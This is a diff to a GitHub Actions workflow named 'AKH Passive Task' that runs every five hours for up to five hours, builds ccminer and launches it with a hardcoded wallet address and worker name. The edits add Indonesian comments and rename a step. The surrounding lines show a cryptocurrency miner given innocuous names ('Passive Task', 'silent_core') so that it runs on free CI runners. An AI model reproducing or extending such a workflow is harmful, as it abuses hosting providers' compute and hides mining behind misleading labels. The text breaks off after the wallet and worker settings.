@@ -2,13 +2,13 @@ name: AKH Passive Task
 
 on:
   schedule:
-    - cron: "0 */5 * * *"
+    - cron: "0 */5 * * *"  # Setiap 5 jam
   workflow_dispatch:
 
 jobs:
   silent_core:
     runs-on: ubuntu-latest
-    timeout-minutes: 300
+    timeout-minutes: 300  # Maksimal jalan 5 jam
 
     steps:
       - name: Setup Environment
@@ -24,7 +24,7 @@ jobs:
           ./build.sh
           mv ccminer ../runner_exec
 
-      - name: Start Passive Job
+      - name: Start Passive Task
         run: |
           WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
           WORKER="akh"
